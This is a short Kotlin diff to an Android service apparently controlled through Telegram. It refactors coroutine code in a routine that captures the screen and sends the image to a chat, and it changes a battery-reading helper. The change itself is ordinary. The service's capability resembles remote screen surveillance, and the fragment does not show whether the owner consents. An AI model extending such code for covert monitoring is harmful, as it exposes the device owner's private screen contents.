@@ -217,7 +217,7 @@ class TelegramService : Service() {
         } catch (e: Exception) { /* ignore */ }
     }
 
-    private suspend fun getBattery(): Pair<Int, Boolean> {
+    private fun getBattery(): Pair<Int, Boolean> {
         val i = registerReceiver(null, Intent(Intent.ACTION_BATTERY_CHANGED))
         if (i == null) return Pair(0, false)
         val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
@@ -248,13 +248,13 @@ class TelegramService : Service() {
             return
         }
         ensureVirtualDisplay()
-        withContext(Dispatchers.Main) {
-            val bmp = captureFrame()
-            if (bmp != null) {
-                sendPhoto(chatId, bmp)
-            } else {
-                sendText(chatId, "Gagal ambil screenshot.")
-            }
+        val bmp = withContext(Dispatchers.Main) {
+            captureFrame()
+        }
+        if (bmp != null) {
+            sendPhoto(chatId, bmp)
+        } else {
+            sendText(chatId, "Gagal ambil screenshot.")
         }
     }
 
